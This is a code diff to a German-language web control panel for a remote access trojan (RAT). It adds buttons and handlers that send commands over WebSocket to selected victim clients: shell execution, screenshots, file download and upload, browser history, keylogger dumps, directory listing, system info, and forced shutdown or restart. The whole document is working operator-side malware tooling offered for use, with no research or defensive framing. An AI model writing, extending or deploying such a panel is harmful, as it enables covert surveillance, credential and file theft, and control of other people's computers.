@@ -2,7 +2,7 @@
 <html lang="de">
   <head>
     <meta charset="UTF-8" />
-    <title>T3 RAT Control Panel</title>
+    <title>RAT Control Panel from J&N</title>
     <style>
       body {
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
@@ -71,6 +71,19 @@
       #controls {
         display: flex;
         gap: 10px;
+        flex-wrap: wrap;
+      }
+      .quick-btn {
+        background-color: #263238;
+        color: #fff;
+        border: 1px solid #333;
+        padding: 8px 12px;
+        border-radius: 5px;
+        margin-right: 5px;
+        font-size: 0.95em;
+      }
+      .quick-btn:hover {
+        background-color: #37474f;
       }
       input[type="text"] {
         flex-grow: 1;
@@ -103,6 +116,22 @@
       .log-cmd {
         color: #2196f3;
       }
+      #upload-input {
+        display: none;
+      }
+      @media (max-width: 900px) {
+        body {
+          flex-direction: column;
+          height: auto;
+        }
+        #client-panel {
+          width: 100%;
+          margin-bottom: 10px;
+        }
+        #main-panel {
+          width: 100%;
+        }
+      }
     </style>
   </head>
   <body>
@@ -117,9 +146,15 @@
         <input
           type="text"
           id="command-input"
-          placeholder="Befehle: exec, screenshot, download, history, keylogger"
+          placeholder="Befehle: exec, screenshot, download, history, keylogger, ls, systeminfo"
         />
         <button id="send-button">Senden</button>
+        <button class="quick-btn" id="btn-systeminfo" title="Systeminfo">Systeminfo</button>
+        <button class="quick-btn" id="btn-ls" title="Verzeichnis auflisten">ls</button>
+        <button class="quick-btn" id="btn-upload" title="Datei hochladen">Upload</button>
+        <button class="quick-btn" id="btn-shutdown" title="Herunterfahren">Shutdown</button>
+        <button class="quick-btn" id="btn-restart" title="Neustart">Restart</button>
+        <input type="file" id="upload-input" />
       </div>
     </div>
 
@@ -129,6 +164,12 @@
       const output = document.getElementById("output");
       const commandInput = document.getElementById("command-input");
       const sendButton = document.getElementById("send-button");
+      const uploadInput = document.getElementById("upload-input");
+      const btnSysteminfo = document.getElementById("btn-systeminfo");
+      const btnLs = document.getElementById("btn-ls");
+      const btnUpload = document.getElementById("btn-upload");
+      const btnShutdown = document.getElementById("btn-shutdown");
+      const btnRestart = document.getElementById("btn-restart");
 
       let selectedClientId = null;
 
@@ -166,48 +207,60 @@
         });
       }
 
-      function sendCommand() {
+      function sendCommand(customPayload = null) {
         if (!selectedClientId) {
           log("Fehler: Kein Client ausgewählt.", "error");
           return;
         }
-        const commandText = commandInput.value.trim();
-        if (!commandText) return;
-
-        const parts = commandText.split(" ");
-        const action = parts[0].toLowerCase();
-        const argument = parts.slice(1).join(" ");
-
-        let payload = {
-          target_id: selectedClientId,
-          action: action,
-        };
-
-        switch (action) {
-          case "exec":
-            payload.command = argument;
-            break;
-          case "download":
-            payload.path = argument;
-            break;
-          case "history":
-            payload.limit = parseInt(argument) || 20;
-            break;
-          case "keylogger":
-            payload.count = parseInt(argument) || 50;
-            break;
-          case "screenshot":
-            break;
-          default:
-            log(
-              "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger",
-              "error"
-            );
-            return;
+        let payload;
+        if (customPayload) {
+          payload = { target_id: selectedClientId, ...customPayload };
+        } else {
+          const commandText = commandInput.value.trim();
+          if (!commandText) return;
+          const parts = commandText.split(" ");
+          const action = parts[0].toLowerCase();
+          const argument = parts.slice(1).join(" ");
+          payload = {
+            target_id: selectedClientId,
+            action: action,
+          };
+          switch (action) {
+            case "exec":
+              payload.command = argument;
+              break;
+            case "download":
+              payload.path = argument;
+              break;
+            case "history":
+              payload.limit = parseInt(argument) || 20;
+              break;
+            case "keylogger":
+              payload.count = parseInt(argument) || 50;
+              break;
+            case "ls":
+              payload.path = argument || ".";
+              break;
+            case "screenshot":
+            case "systeminfo":
+            case "shutdown":
+            case "restart":
+              break;
+            default:
+              log(
+                "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger, ls, systeminfo, shutdown, restart",
+                "error"
+              );
+              return;
+          }
         }
-
         ws.send(JSON.stringify(payload));
-        log(`Befehl gesendet: ${commandText}`, "cmd");
+        log(
+          `Befehl gesendet: ${payload.action}${
+            payload.command ? " " + payload.command : payload.path ? " " + payload.path : ""
+          }`,
+          "cmd"
+        );
         commandInput.value = "";
       }
 
@@ -246,7 +299,9 @@
             if (selectedClientId === data.client_id) selectedClientId = null;
             break;
           case "command_output":
-            log(`[Client ${data.client_id}] Ausgabe:\n${data.output}`);
+            log(
+              `[Client ${data.client_id || selectedClientId}] Ausgabe:\n${data.output}`
+            );
             break;
           case "screenshot":
             log(`[Client ${data.client_id}] Screenshot empfangen.`);
@@ -274,6 +329,43 @@
       commandInput.addEventListener("keydown", (e) => {
         if (e.key === "Enter") sendCommand();
       });
+      btnSysteminfo.onclick = () => sendCommand({ action: "systeminfo" });
+      btnLs.onclick = () => {
+        const dir = prompt("Verzeichnis auflisten (leer für aktuelles):", ".");
+        sendCommand({ action: "ls", path: dir || "." });
+      };
+      btnShutdown.onclick = () => {
+        if (confirm("Client wirklich herunterfahren?")) sendCommand({ action: "shutdown" });
+      };
+      btnRestart.onclick = () => {
+        if (confirm("Client wirklich neustarten?")) sendCommand({ action: "restart" });
+      };
+      btnUpload.onclick = () => uploadInput.click();
+      uploadInput.onchange = () => {
+        if (!selectedClientId) {
+          log("Kein Client ausgewählt.", "error");
+          return;
+        }
+        const file = uploadInput.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = function (e) {
+          const dataB64 = btoa(
+            new Uint8Array(e.target.result)
+              .reduce((data, byte) => data + String.fromCharCode(byte), "")
+          );
+          ws.send(
+            JSON.stringify({
+              target_id: selectedClientId,
+              action: "upload",
+              filename: file.name,
+              data: dataB64,
+            })
+          );
+          log(`Datei-Upload gesendet: ${file.name}`, "cmd");
+        };
+        reader.readAsArrayBuffer(file);
+      };
     </script>
   </body>
 </html>
